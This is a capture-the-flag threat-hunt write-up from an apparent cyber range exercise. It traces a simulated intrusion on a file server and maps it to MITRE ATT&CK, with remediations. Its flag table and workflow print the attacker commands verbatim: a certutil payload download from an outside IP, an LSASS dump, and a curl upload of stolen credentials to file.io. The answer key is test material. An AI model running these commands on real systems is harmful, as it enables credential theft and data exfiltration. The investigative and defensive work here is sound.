# 🚢 Threat Hunt SAGA#2: Cargo Hold

**Sandbox Contributor:** [Cyber Range AZURE LAW by Josh Madakor's team](https://www.skool.com/cyber-community)  
**Hunt Design Master:** Mohammed A  
**Loyal Wingman (woman):** [Adetola Kolawole](https://github.com/AdetolaKols), Agentic SOC Analyst

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 📏 Perimeters
Date Completed: ***2026-02-14***  
Wingmen (woman) List: **[Adetola Kolawole](https://github.com/AdetolaKols)**, Agentic SOC Analyst  
Simulated Environment: `Cyber Range AZURE LAW`  
Primary Impacted Host: `AZUKI-FileServer01`  
Incident Date Range: ***2025-11-19 to 2026-01-13***  
Hunt Link: [Cyber Range SOC - Cargo Hold](https://docs.google.com/forms/d/e/1FAIpQLSc3bRTzUC8DV2Wvy0cUkaQzCmWKQszo7e5C9Mb-bPPAlHRCSg/viewform)  
Frameworks Applied: ***MITRE ATT&CK***, ***NIST 800-61***

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 📄 Overview
Azuki Import/Export detected a return connection roughly 72 hours after initial access, followed by lateral movement and large data transfers from the file server. Microsoft Defender for Endpoint telemetry shows a compact, deliberate chain: re-entry from a new public IP, RDP pivot to the file server, share reconnaissance, privilege and network discovery, hidden staging, tool transfer, credential harvesting, data staging and compression, cloud exfiltration, persistence via Run keys, and anti-forensic cleanup.

The actor relied heavily on built-in tooling and low-noise tactics, indicating a focus on evasion and operational efficiency rather than malware-heavy tradecraft.

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 💠 Diamond Model Analysis
| Feature | Details |
|---|---|
| **Adversary** | Unattributed. Demonstrates operational discipline, LOLBin usage, and basic OPSEC (tool renaming, hidden staging, history deletion). |
| **Infrastructure** | Re-entry IP `159.26.106.98`. Payload host `78.141.196.6:7331`. Exfil service `file.io`. |
| **Capability** | RDP pivot, share enumeration (`net.exe`), privilege discovery (`whoami /all`), network discovery (`ipconfig /all`), directory hiding (`attrib +h +s`), tool transfer (`certutil`), staging (`xcopy`), archiving (`tar`), LSASS dump (`pd.exe`), persistence (`HKLM\...\Run`), anti-forensics (PowerShell history deletion). |
| **Victim** | Azuki Import/Export Trading Co. File server compromised: `AZUKI-FileServer01`. Compromised account: `fileadmin`. |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 🥋 MITRE ATT&CK Table
| Stage | Flag | Tactic | Technique ID | Technique |
|---|---|---|---|---|
| Initial Access | 1 | Initial Access | **T1021.001** | Remote Services: Remote Desktop Protocol |
| Lateral Movement | 2 | Lateral Movement | **T1021.001** | Remote Services: Remote Desktop Protocol |
| Lateral Movement | 3 | Lateral Movement | **T1078** | Valid Accounts |
| Discovery | 4 | Discovery | **T1135** | Network Share Discovery |
| Discovery | 5 | Discovery | **T1135** | Network Share Discovery |
| Discovery | 6 | Discovery | **T1033** | System Owner/User Discovery |
| Discovery | 7 | Discovery | **T1016** | System Network Configuration Discovery |
| Defense Evasion | 8 | Defense Evasion | **T1564.001** | Hidden Files and Directories |
| Collection | 9 | Collection | **T1074.001** | Data Staged: Local Data Staging |
| Command & Control | 10 | Command & Control | **T1105** | Ingress Tool Transfer |
| Collection | 11 | Collection | **T1552** | Unsecured Credentials |
| Collection | 12 | Collection | **T1119** | Automated Collection |
| Collection | 13 | Collection | **T1560.001** | Archive Collected Data: Archive via Utility |
| Defense Evasion | 14 | Defense Evasion | **T1036.003** | Masquerading: Rename System Utilities |
| Credential Access | 15 | Credential Access | **T1003.001** | OS Credential Dumping: LSASS Memory |
| Exfiltration | 16 | Exfiltration | **T1567** | Exfiltration Over Web Service |
| Exfiltration | 17 | Exfiltration | **T1567.002** | Exfiltration to Cloud Storage |
| Persistence | 18 | Persistence | **T1547.001** | Boot or Logon Autostart Execution: Registry Run Keys |
| Defense Evasion | 19 | Defense Evasion | **T1036.005** | Masquerading: Match Legitimate Name or Location |
| Defense Evasion | 20 | Defense Evasion | **T1070.003** | Indicator Removal: Clear Command History |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## ⛨ Remediation Actions
1. **RDP and Account Hardening**
   - Enforce MFA for remote access and restrict RDP to VPN-only networks.
   - Rotate `fileadmin` credentials and audit privileged account usage.

2. **Discovery and Enumeration Detection**
   - Alert on `net.exe` share enumeration and repeated UNC queries.
   - Monitor `whoami /all` and `ipconfig /all` bursts after logon.

3. **LOLBin Abuse Monitoring**
   - Alert on `certutil.exe -urlcache` usage with external URLs.
   - Restrict execution of unsigned tools from system log paths.

4. **Credential Protection**
   - Enable LSASS protection and block Procdump-like tools.
   - Monitor for dump file creation in non-standard locations.

5. **Data Staging and Exfiltration Controls**
   - Alert on `xcopy`/`tar` usage in system log directories.
   - Enforce egress controls and DLP for public file sharing services.

6. **Persistence Monitoring**
   - Audit registry Run keys for suspicious values (e.g., `FileShareSync`).
   - Validate paths referenced by autorun entries.

7. **Forensic Integrity**
   - Enable PowerShell logging and forward logs to a tamper-resistant SIEM.
   - Alert on deletion of PowerShell history files.

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## ✍️ Lessons Learned
- **Dwell-time returns are common:** Re-entry infrastructure often changes to evade IOCs.
- **File servers are prime targets:** Share discovery and staging converge on data-heavy systems.
- **Staging often hides in plain sight:** System log paths are commonly abused for concealment.
- **LOLBin dependency increases stealth:** Certutil, xcopy, and tar blend with admin activity.
- **Persistence is lightweight but effective:** Simple Run keys can survive without loud artifacts.
- **Anti-forensics is late-stage:** History deletion signals a completed operation.

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 🏔️ Conclusion
The Cargo Hold investigation shows a compact but complete intrusion lifecycle: return access via a new public IP → RDP pivot to a file server → discovery and privilege enumeration → hidden staging → payload retrieval via `certutil` → credential file discovery and recursive staging → compression → LSASS memory dumping → cloud exfiltration → persistence via Run key → PowerShell history deletion. The operator avoided custom tooling, relying on trusted system binaries and brief, surgical steps to move from re-entry to data theft.

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

# 🎯 Capture The Flags

## 🚩 Completed Flag Map
| Flag | Objective | Value |
|---|---|---|
| **1** | Return connection source IP | "159.26.106.98" |
| **2** | Compromised file server | "AZUKI-FileServer01" |
| **3** | Compromised admin account | "fileadmin" |
| **4** | Local share enumeration command | "\"net.exe\" share" |
| **5** | Remote share enumeration command | "\"net.exe\" view \\\\10.1.0.188" |
| **6** | Privilege enumeration command | "whoami.exe /all" |
| **7** | Network configuration command | "ipconfig.exe /all" |
| **8** | Directory hiding command | "attrib.exe +h +s C:\\Windows\\Logs\\CBS" |
| **9** | Staging directory path | "C:\\Windows\\Logs\\CBS" |
| **10** | Script download command | "certutil.exe -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\\Windows\\Logs\\CBS\\ex.ps1" |
| **11** | Credential file name | "IT-Admin-Passwords.csv" |
| **12** | Recursive staging copy command | "xcopy.exe C:\\FileShares\\IT-Admin C:\\Windows\\Logs\\CBS\\it-admin /E /I /H /Y" |
| **13** | Compression command | "tar.exe -czf C:\\Windows\\Logs\\CBS\\credentials.tar.gz -C C:\\Windows\\Logs\\CBS\\it-admin ." |
| **14** | Renamed dump tool | "pd.exe" |
| **15** | LSASS dump command | "pd.exe -accepteula -ma 876 C:\\Windows\\Logs\\CBS\\lsass.dmp" |
| **16** | Exfiltration command | "curl.exe -F file=@C:\\Windows\\Logs\\CBS\\credentials.tar.gz https://file.io" |
| **17** | Exfiltration service | "file.io" |
| **18** | Persistence registry value name | "FileShareSync" |
| **19** | Persistence beacon filename | "svchost.ps1" |
| **20** | PowerShell history file deleted | "ConsoleHost_history.txt" |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 🔎 Analyst Workflow
### From an investigative standpoint, the workflow progressed as follows:
**1 🚩:** Re-entry from a different public IP indicates a return session after dwell time; the return source was **"159.26.106.98"**.  
**2 🚩:** RDP lateral movement identified the file server that received the pivot; the compromised device was **"AZUKI-FileServer01"**.  
**3 🚩:** Activity on the file server centered on a privileged file management account; the account was **"fileadmin"**.  
**4 🚩:** Local share discovery established which data repositories were exposed; the command was **"\"net.exe\" share"**.  
**5 🚩:** Remote share discovery expanded the map to other systems; the command was **"\"net.exe\" view \\\\10.1.0.188"**.  
**6 🚩:** Privilege enumeration confirmed group memberships and tokens; the command was **"whoami.exe /all"**.  
**7 🚩:** Network configuration discovery captured detailed adapter and DNS context; the command was **"ipconfig.exe /all"**.  
**8 🚩:** Staging was hidden to evade casual discovery; the command was **"attrib.exe +h +s C:\\Windows\\Logs\\CBS"**.  
**9 🚩:** The hidden staging location used for tools and data was **"C:\\Windows\\Logs\\CBS"**.  
**10 🚩:** A LOLBin was used to download tooling into staging; the command was **"certutil.exe -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\\Windows\\Logs\\CBS\\ex.ps1"**.  
**11 🚩:** Credentials were staged in a spreadsheet-friendly file; the file was **"IT-Admin-Passwords.csv"**.  
**12 🚩:** A recursive copy staged the full share with attributes preserved; the command was **"xcopy.exe C:\\FileShares\\IT-Admin C:\\Windows\\Logs\\CBS\\it-admin /E /I /H /Y"**.  
**13 🚩:** Staged data was compressed for transfer; the command was **"tar.exe -czf C:\\Windows\\Logs\\CBS\\credentials.tar.gz -C C:\\Windows\\Logs\\CBS\\it-admin ."**.  
**14 🚩:** The credential dumping tool was renamed for OPSEC; the tool was **"pd.exe"**.  
**15 🚩:** The attacker dumped LSASS to harvest credentials; the command was **"pd.exe -accepteula -ma 876 C:\\Windows\\Logs\\CBS\\lsass.dmp"**.  
**16 🚩:** The compressed archive was exfiltrated via HTTP POST; the command was **"curl.exe -F file=@C:\\Windows\\Logs\\CBS\\credentials.tar.gz https://file.io"**.  
**17 🚩:** The exfiltration endpoint was a public file-sharing service; the service was **"file.io"**.  
**18 🚩:** Persistence was established with a Run key value; the value name was **"FileShareSync"**.  
**19 🚩:** The Run key launched a masqueraded script; the beacon was **"svchost.ps1"**.  
**20 🚩:** The attacker cleared PowerShell history to reduce evidence; the file deleted was **"ConsoleHost_history.txt"**.
